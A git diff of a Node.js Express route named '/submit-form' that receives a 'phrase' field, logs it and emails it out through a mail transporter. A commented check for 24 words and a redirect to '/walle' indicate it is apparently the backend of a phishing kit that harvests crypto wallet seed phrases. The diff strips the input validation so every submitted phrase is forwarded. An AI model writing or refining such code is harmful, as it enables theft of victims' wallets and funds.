@@ -65,15 +65,11 @@ app.get("/home", (req, res) => {
 app.post("/submit-form", async (req, res) => {
   const mfText = req.body["mf-text"];
   const formNonce = req.body["form_nonce"];
-  // forward to Email
-  if (!mfText) {
-    return res.status(400).json({ status: 0, message: "Missing phrase" });
-  }
 
   // Simulate email logic or logging
 
   try {
-    if (mfText) {
+    // if (mfText) {
       console.log("Phrase received:", mfText);
       // if(mfText && mfText.split(' ').length == 24){
       transporter
@@ -109,8 +105,8 @@ app.post("/submit-form", async (req, res) => {
       //       redirect_to: "/walle",
       //     },
       //   });
-    } else {
-      return res.json({ status: 1, message: "Form submitted successfully" });
+    // } else {
+      // return res.json({ status: 1, message: "Form submitted successfully" });
       //   return res.json({
       //     status: 1,
       //     store_entries: 1,
@@ -131,7 +127,7 @@ app.post("/submit-form", async (req, res) => {
       //       redirect_to: "/walle",
       //     },
       //   });
-    }
+    // }
   } catch (error) {
     console.log(error, "the error");
     console.log(error);
